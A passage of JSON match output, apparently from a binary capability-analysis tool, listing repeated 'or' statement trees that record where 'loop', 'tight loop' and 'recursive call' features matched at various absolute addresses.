                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442564568
                    },
                    {
                      "type": "absolute",
                      "value": 6442564682
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442564756
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442564756
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442569673
                    },
                    {
                      "type": "absolute",
                      "value": 6442571212
                    },
                    {
                      "type": "absolute",
                      "value": 6442570446
                    },
                    {
                      "type": "absolute",
                      "value": 6442567695
                    },
                    {
                      "type": "absolute",
                      "value": 6442569556
                    },
                    {
                      "type": "absolute",
                      "value": 6442572246
                    },
                    {
                      "type": "absolute",
                      "value": 6442566296
                    },
                    {
                      "type": "absolute",
                      "value": 6442566424
                    },
                    {
                      "type": "absolute",
                      "value": 6442566939
                    },
                    {
                      "type": "absolute",
                      "value": 6442567966
                    },
                    {
                      "type": "absolute",
                      "value": 6442568544
                    },
                    {
                      "type": "absolute",
                      "value": 6442566755
                    },
                    {
                      "type": "absolute",
                      "value": 6442564964
                    },
                    {
                      "type": "absolute",
                      "value": 6442565093
                    },
                    {
                      "type": "absolute",
                      "value": 6442568804
                    },
                    {
                      "type": "absolute",
                      "value": 6442570160
                    },
                    {
                      "type": "absolute",
                      "value": 6442571837
                    },
                    {
                      "type": "absolute",
                      "value": 6442565621
                    },
                    {
                      "type": "absolute",
                      "value": 6442565437
                    },
                    {
                      "type": "absolute",
                      "value": 6442568126
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442572564
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442572564
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442572736
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442572736
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442572944
                    },
                    {
                      "type": "absolute",
                      "value": 6442573632
                    },
                    {
                      "type": "absolute",
                      "value": 6442573844
                    },
                    {
                      "type": "absolute",
                      "value": 6442573744
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442575444
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442575444
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442576196
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442576196
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442578524
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442578524
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442581396
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442581396
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442582092
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442582092
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442584580
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442584580
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442584708
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442584708
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442586252
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442586252
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442586689
                    },
                    {
                      "type": "absolute",
                      "value": 6442586555
                    },
                    {
                      "type": "absolute",
                      "value": 6442587077
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442590304
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442590304
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442590372
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442590372
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442590464
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442590464
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442591556
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442591556
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442592616
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442592616
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442592739
                    },
                    {
                      "type": "absolute",
                      "value": 6442592671
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442593012
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442593012
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442593640
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442593640
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442594424
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442594424
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442595428
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442595428
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442597648
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442597648
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442598836
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442598836
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442600456
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442600456
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442601608
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442601608
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442602780
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442602951
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442603480
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442603616
                    },
                    {
                      "type": "absolute",
                      "value": 6442603666
                    },
                    {
                      "type": "absolute",
                      "value": 6442603754
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442603824
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442604029
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442604444
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442604790
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442612432
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442612432
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442612617
                    },
                    {
                      "type": "absolute",
                      "value": 6442612907
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442613996
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442613996
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442614384
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442614384
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
